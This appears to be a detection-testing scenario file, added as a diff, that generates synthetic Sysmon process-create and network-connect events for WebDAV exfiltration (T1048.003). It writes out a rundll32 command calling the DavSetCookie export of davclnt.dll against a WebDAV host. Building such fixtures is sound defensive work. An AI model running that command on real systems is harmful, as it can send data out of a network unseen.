@@ -1,0 +1,183 @@
+type: scenario
+description: |
+  The WebClient service starts rundll32.exe for a WebDAV address, and that
+  process connects to a public IP address. Sysmon EID 1 (Process Create)
+  records rundll32.exe started by the WebClient service host
+  (svchost.exe -s WebClient) with a command line that calls the DavSetCookie
+  export of davclnt.dll, the Windows WebDAV client library, with a WebDAV
+  host and URL, and Sysmon EID 3 (Network Connect) records an outbound TCP
+  connection from the same process to a public IP address on port 443. The
+  events record the launch and the connection, not what was sent over it.
+tags: [eid1, eid3]
+mitre:
+  tactics: [exfiltration]
+  techniques: [T1048.003]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  sysmon_pid:          gen.int(min=1000, max=4000)
+  process_tid:         gen.int(min=1000, max=9999)
+  network_tid:         gen.int(min=1000, max=9999)
+  user_name:           Administrator
+  user:                "${ref.domain_short}\\${ref.user_name}"
+  logon_guid_raw:      fn.upper(gen.uuid())
+  logon_guid:          "{${ref.logon_guid_raw}}"
+  logon_id_hex:        gen.hex(len=6)
+  logon_id:            "0x${ref.logon_id_hex}"
+  process_guid_raw:    fn.upper(gen.uuid())
+  process_guid:        "{${ref.process_guid_raw}}"
+  process_id:          gen.int(min=1000, max=9999)
+  parent_guid_raw:     fn.upper(gen.uuid())
+  parent_process_guid: "{${ref.parent_guid_raw}}"
+  parent_process_id:   gen.int(min=1000, max=9999)
+  process_record_id:   gen.int(min=5000, max=4999999)
+  network_record_id:   gen.int(min=5000000, max=9999999)
+  command_line:        "rundll32.exe  c:\\windows\\system32\\davclnt.dll,DavSetCookie 10.0.1.14 http://10.0.1.14/foo"
+  current_directory:   "C:\\Users\\${ref.user_name}\\"
+  source_ip_octet:     gen.int(min=2, max=254)
+  source_ip:           "10.0.1.${ref.source_ip_octet}"
+  source_port:         gen.int(min=49152, max=65535)
+  dest_ip:             82.165.105.236
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.process_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.process_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": "C:\\Windows\\System32\\rundll32.exe"
+            - "@Name": FileVersion
+              "#text": "10.0.14393.4169 (rs1_release.210107-1130)"
+            - "@Name": Description
+              "#text": "Windows host process (Rundll32)"
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": RUNDLL32.EXE
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": 2
+            - "@Name": IntegrityLevel
+              "#text": High
+            - "@Name": Hashes
+              "#text": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667"
+            - "@Name": ParentProcessGuid
+              "#text": ref.parent_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.parent_process_id
+            - "@Name": ParentImage
+              "#text": "C:\\Windows\\System32\\svchost.exe"
+            - "@Name": ParentCommandLine
+              "#text": "\"C:\\Windows\\system32\\svchost.exe\" -s WebClient"
+            - "@Name": ParentUser
+              "#text": ref.user
+
+  # No wait step: detections that join the two events by process id need both
+  # in the same search window.
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 3
+          Version: 5
+          Level: 4
+          Task: 3
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.network_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.network_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": "C:\\Windows\\System32\\rundll32.exe"
+            - "@Name": User
+              "#text": ""
+            - "@Name": Protocol
+              "#text": tcp
+            - "@Name": Initiated
+              "#text": "true"
+            - "@Name": SourceIsIpv6
+              "#text": "false"
+            - "@Name": SourceIp
+              "#text": ref.source_ip
+            - "@Name": SourceHostname
+              "#text": "-"
+            - "@Name": SourcePort
+              "#text": ref.source_port
+            - "@Name": SourcePortName
+              "#text": "-"
+            - "@Name": DestinationIsIpv6
+              "#text": "false"
+            - "@Name": DestinationIp
+              "#text": ref.dest_ip
+            - "@Name": DestinationHostname
+              "#text": "-"
+            - "@Name": DestinationPort
+              "#text": 443
+            - "@Name": DestinationPortName
+              "#text": "-"
